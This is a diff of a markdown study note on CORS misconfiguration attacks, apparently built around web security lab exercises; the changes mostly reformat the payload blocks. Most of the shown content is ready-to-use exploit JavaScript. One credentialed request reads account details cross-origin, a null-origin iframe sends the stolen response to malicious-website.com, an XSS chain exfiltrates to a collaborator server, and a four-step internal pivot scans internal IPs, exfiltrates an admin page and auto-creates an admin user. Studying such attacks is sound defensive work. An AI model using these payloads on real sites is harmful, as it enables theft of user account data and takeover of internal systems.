@@ -16,15 +16,19 @@ A browser mechanism which enables controlled access to resources located outside
 
 * Server-generated `Access-Control-Allow-Origin` header directly reflects the client-specified `Origin` header.
 * Test whether the `Origin` header value is reflected arbitrarily in the response's `Access-Control-Allow-Origin` header, along with `Access-Control-Allow-Credentials: true`.
-* **Payload:**
 
+<details>
+
+<summary><strong>Payload</strong></summary>
+
+{% code lineNumbers="true" %}
 ```html
 <html>
   <body>
     <script>
         var req = new XMLHttpRequest();
         req.onload = reqListener;
-        req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+        req.open('get','https://url/accountDetails',true);
         req.withCredentials = true;
         req.send();
 
@@ -35,6 +39,9 @@ A browser mechanism which enables controlled access to resources located outside
   </body>
 </html>
 ```
+{% endcode %}
+
+</details>
 
 ## CORS Vulnerability with Trusted Null Origin
 
@@ -52,8 +59,12 @@ A browser mechanism which enables controlled access to resources located outside
   * Sandboxed cross-origin requests.
 * Application might whitelist `null` to support local development.
 * Bypassed using a sandboxed cross-origin `iframe` request.
-* **Payload:**
 
+<details>
+
+<summary><strong>Payload</strong></summary>
+
+{% code lineNumbers="true" %}
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 var req = new XMLHttpRequest();
@@ -65,8 +76,13 @@ req.send();
 function reqListener() {
     location='https://malicious-website.com/log?key='+encodeURIComponent(this.responseText);
 };
-</script>"></iframe>
+</script>
+">
+</iframe>
 ```
+{% endcode %}
+
+</details>
 
 ## CORS Vulnerability with Trusted Insecure Protocols
 
@@ -86,13 +102,20 @@ function reqListener() {
   6. The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
   7. The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
 * If an application trusts a vulnerable subdomain (XSS), we can exploit the CORS vulnerability in the actual application by leveraging the XSS vulnerability present in the trusted subdomain or URL. (Test for both HTTP and HTTPS protocols.)
-* **Payload:**
 
+<details>
+
+<summary><strong>Payload</strong></summary>
+
+{% code lineNumbers="true" %}
 ```html
 <script>
 document.location="http://trusted-vulnerable-website.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://cors-misconfigured-website.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://collaborator-server.com/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
+{% endcode %}
+
+</details>
 
 ## CORS Vulnerability with Internal Network Pivot Attack
 
@@ -102,7 +125,12 @@ Used to pivot from a public-facing CORS-vulnerable application into scanning/exp
 
 ### Step 1 - Internal IP Scanning
 
-```javascript
+<details>
+
+<summary><strong>Payload</strong></summary>
+
+{% code lineNumbers="true" %}
+```html
 <script>
 var q = [], collaboratorURL = 'http://$collaboratorPayload';
 
@@ -137,33 +165,44 @@ function fetchUrl(url, wait) {
 }
 </script>
 ```
+{% endcode %}
+
+</details>
 
 ### Step 2 - Detect XSS on Discovered Internal Host
 
-```javascript
+<details>
+
+<summary><strong>Payload</strong></summary>
+
+```html
 <script>
 function xss(url, text, vector) {
     location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
 }
-
 function fetchUrl(url, collaboratorURL){
     fetch(url).then(r => r.text().then(text => {
         xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
     }))
 }
-
 fetchUrl("http://$ip", "http://$collaboratorPayload");
 </script>
 ```
 
+</details>
+
 ### Step 3 - Exfiltrate Internal Admin Page via XSS
 
-```javascript
+<details>
+
+<summary><strong>Payload</strong></summary>
+
+{% code lineNumbers="true" %}
+```html
 <script>
 function xss(url, text, vector) {
     location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
 }
-
 function fetchUrl(url, collaboratorURL){
     fetch(url).then(r=>r.text().then(text=>
     {
@@ -171,19 +210,25 @@ function fetchUrl(url, collaboratorURL){
     }
     ))
 }
-
 fetchUrl("http://$ip", "http://$collaboratorPayload");
 </script>
 ```
+{% endcode %}
+
+</details>
 
 ### Step 4 - Auto-Create Admin User via XSS
 
-```javascript
+<details>
+
+<summary><strong>Payload</strong></summary>
+
+{% code lineNumbers="true" %}
+```html
 <script>
 function xss(url, text, vector) {
     location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
 }
-
 function fetchUrl(url){
     fetch(url).then(r=>r.text().then(text=>
     {
@@ -191,7 +236,9 @@ function fetchUrl(url){
     }
     ))
 }
-
 fetchUrl("http://$ip");
 </script>
 ```
+{% endcode %}
+
+</details>
